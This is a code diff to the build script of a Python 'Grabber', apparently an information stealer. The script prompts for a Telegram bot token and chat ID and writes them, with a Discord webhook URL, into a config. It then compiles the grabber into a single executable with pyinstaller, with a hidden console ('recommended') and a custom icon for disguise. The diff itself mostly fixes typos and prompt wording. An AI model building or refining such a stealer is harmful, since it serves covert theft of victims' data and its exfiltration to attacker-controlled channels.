@@ -81,7 +81,7 @@ while True:
         while True:
             token = _input(f'{y}[>]Enter telegram bot token [t.me/BotFather](q - exit) =>{g}')
             if token.lower() == 'q':
-                token = False
+                token = chat_id = style_telegram = telegram = False
                 break
             request = py_telegram.utils.request.Request(read_timeout=10)
             try:
@@ -107,16 +107,14 @@ while True:
     else:
         token = chat_id = style_telegram = telegram = False
     
-    hide = _input(f'{y}[>]Hide Grabber console? [{g}recommended{y}]({g}y{y}/{r}n{y})\n  {b}[1] - Hide\n  {b}[2] - No Hide\n{y}====>{g}').lower()
+    hide = _input(f'{y}[>]Hide Grabber Console? [{g}recommended{y}]\n  {b}[1] - Hide\n  {b}[2] - No Hide\n{y}====>{g}').lower()
     hide = '--noconsole' if hide == '1' else ''
-    icon = _input(f'{y}[>]Set icon for program?({g}y{y}/{r}n{y}) {y}=>{g}').lower()
+    icon = _input(f'{y}[>]Set icon for Grabber?({g}y{y}/{r}n{y}) {y}=>{g}').lower()
     if icon == 'y':
-        icon = '--icon="' + _input(f'{y}Iput icon path =>{g}') + '"'
-
+        icon = '--icon="' + _input(f'{y}Input icon path =>{g}') + '"'
     else:
         icon = ''
     
-
     if discord or telegram:
         config_settings = f'''
 WEBHOOK_URL = """{webhook}"""
@@ -133,5 +131,3 @@ TELEGRAM_USER_ID = """{chat_id}"""'''
         print(f'Build...')
         os.system(f'pyinstaller {icon} --onefile ./temp/{name}.py --name {name} --distpath ./build  --log-level ERROR {hide}')
         _input(f'{w}Build End... Press Enter For Return...')
-
-
